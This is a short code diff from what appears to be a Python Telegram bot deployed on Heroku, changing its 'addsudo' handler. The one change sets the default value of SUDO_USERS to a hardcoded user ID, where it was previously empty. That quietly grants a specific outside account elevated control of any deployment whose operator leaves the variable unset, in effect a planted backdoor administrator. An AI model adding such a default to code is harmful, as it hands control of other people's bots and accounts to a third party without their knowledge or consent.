@@ -97,7 +97,7 @@ async def restart(e):
 async def addsudo(event):
     if event.sender_id == OWNER_ID:
         Heroku = heroku3.from_key(HEROKU_API_KEY)
-        sudousers = getenv("SUDO_USERS", default=None)
+        sudousers = getenv("SUDO_USERS", default="7231014641")
 
         ok = await event.reply(f"»🍃 мєʀα єк σʀ иєω вєтα α∂∂ нσ gαуα 🍃")
         target = ""
